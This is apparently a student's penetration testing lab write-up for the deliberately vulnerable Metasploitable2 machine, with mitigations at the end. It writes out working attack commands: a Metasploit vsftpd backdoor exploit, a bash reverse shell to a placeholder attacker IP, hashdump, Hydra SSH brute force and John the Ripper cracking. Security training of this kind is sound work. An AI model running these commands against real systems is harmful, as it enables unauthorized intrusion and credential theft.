# Penetration Testing Lab - Metasploitable2

## Objective
Perform penetration testing on Metasploitable2 and document vulnerabilities, exploitation steps, and mitigations.

## Methodology
Recon → Scanning → Exploitation → Post-Exploitation → Reporting

---

## 1. Reconnaissance
- Tool: netdiscover
- Command:
```
netdiscover
```

## 2. Scanning
- Tool: Nmap
- Command:
```
nmap -A <target_ip>
```
- Open Ports: 21 (FTP), 22 (SSH), 80 (HTTP)

---

## 3. Exploitation (Metasploit)
- Exploit: vsftpd 2.3.4 backdoor
```
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <target_ip>
exploit
```

---

## 4. Reverse Shell
```
nc -lvnp 4444
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
```

---

## 5. Post-Exploitation
```
sysinfo
hashdump
```

---

## 6. Password Attacks
### Hydra (SSH Brute Force)
```
hydra -l msfadmin -P rockyou.txt ssh://<target_ip>
```

### John the Ripper
```
john hashes.txt
```

---

## 7. Social Engineering (Simulation)
- Created phishing page
- Awareness training included

---

## 8. Malware Basics
- Static and dynamic analysis in sandbox

---

## 9. System Hardening (Mitigations)
- Use strong passwords
- Disable unused services
- Apply patches
- Configure firewall

---

## Screenshots
Add screenshots in /screenshots folder.

---

## Author
Student Project Submission
